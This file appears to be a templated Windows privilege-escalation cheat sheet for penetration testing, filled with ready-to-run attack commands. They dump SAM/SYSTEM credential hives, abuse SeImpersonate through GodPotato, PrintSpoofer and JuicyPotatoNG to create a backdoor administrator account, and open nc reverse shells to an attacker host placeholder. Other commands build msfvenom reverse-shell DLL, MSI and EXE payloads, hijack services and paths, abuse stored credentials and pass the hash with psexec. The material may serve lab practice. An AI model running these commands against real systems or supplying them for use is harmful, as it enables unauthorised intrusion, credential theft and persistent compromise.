# === TOKEN PRIVILEGES (CHECK FIRST) ===
whoami /priv
# SeBackupPrivilege = SAM/SYSTEM dump
#!cmd reg save hklm\sam C:\temp\SAM
#!cmd reg save hklm\system C:\temp\SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# >>> SeImpersonate / SeAssignPrimaryToken -> Potato Family
# GodPotato - Server 2019 / Win10+
#!cmd .\GodPotato.exe -cmd "cmd /c whoami"
#!cmd .\GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"
# PrintSpoofer - alternative for SeImpersonate
#!cmd .\PrintSpoofer.exe -i -c cmd
#!cmd .\PrintSpoofer.exe -c "C:\temp\nc.exe {{KALI}} {{KALI_REV_PORT}} -e cmd"
# JuicyPotatoNG - Server 2016/2019
#!cmd .\JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c net user hacker P@ss123 /add"
# <<<

# === SERVICE ATTACKS ===
# 1. Unquoted service path
#!cmd wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"
#!cmd sc stop {{SERVICE}} && sc start {{SERVICE}}
# 2. Writable service binary - check then replace
#!cmd .\accesschk64.exe {{USER}} -wvu "C:\Program Files" -accepteula
#!cmd sc stop {{SERVICE}} && sc start {{SERVICE}}
# 3. Weak service registry permissions
#!cmd .\accesschk64.exe -kwsu "Authenticated Users" HKLM\System\CurrentControlSet\Services -accepteula
#!cmd reg add "HKLM\SYSTEM\CurrentControlSet\Services\{{SERVICE}}" /t REG_EXPAND_SZ /v ImagePath /d "C:\temp\shell.exe" /f
#!cmd sc stop {{SERVICE}} && sc start {{SERVICE}}

# === DLL HIJACKING ===
# Identify missing DLLs via Process Monitor (RDP) or manual enum
# Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST={{KALI}} LPORT={{KALI_REV_PORT}} -f dll -o {{DLL_NAME}}.dll

# === ALWAYSINSTALLELEVATED ===
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
# Both must be 1
msfvenom -p windows/shell_reverse_tcp LHOST={{KALI}} LPORT={{KALI_REV_PORT}} -f msi -o shell.msi
#!cmd msiexec /quiet /qn /i C:\temp\shell.msi

# === SCHEDULED TASK HIJACKING ===
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# === PATH HIJACKING ===
$env:PATH.Split(';')
# Drop malicious binary named after commonly-called binary in writable PATH dir
msfvenom -p windows/shell_reverse_tcp LHOST={{KALI}} LPORT={{KALI_REV_PORT}} -f exe -o {{BINARY_NAME}}.exe

# === STORED CREDENTIALS ===
#!cmd cmdkey /list
#!cmd runas /savecred /user:{{USER}} "cmd /c C:\temp\nc.exe {{KALI}} {{KALI_REV_PORT}} -e cmd"

# === SAM/SYSTEM DUMP ===
#!cmd reg save hklm\sam C:\temp\SAM
#!cmd reg save hklm\system C:\temp\SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-psexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{NTLM_HASH}}
